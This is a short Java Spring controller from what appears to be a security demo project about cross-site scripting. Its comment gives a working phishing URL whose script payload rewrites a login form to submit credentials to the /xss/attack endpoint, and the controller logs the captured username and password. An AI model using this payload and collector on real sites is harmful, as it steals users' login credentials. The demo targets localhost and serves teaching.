package com.fengquanwei.muse.web.attack.xss;

import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;

/**
 * XSS：跨站脚本攻击
 * 钓鱼 URL：http://127.0.0.1:8081/login?username="/><script>var+f=document.getElementById("login");+f.action="http://127.0.0.1:8081/xss/attack";+f.method="get";</script><span+s="
 *
 * @author fengquanwei
 * @create 2018/12/9 22:23
 **/
@Controller
@RequestMapping("/xss")
public class XssController {
    @RequestMapping("/attack")
    public String attack(String username, String password, Model model) {
        System.out.println("attack: [" + username + "/" + password + "]");

        model.addAttribute("username", username);
        return "welcome";
    }
}
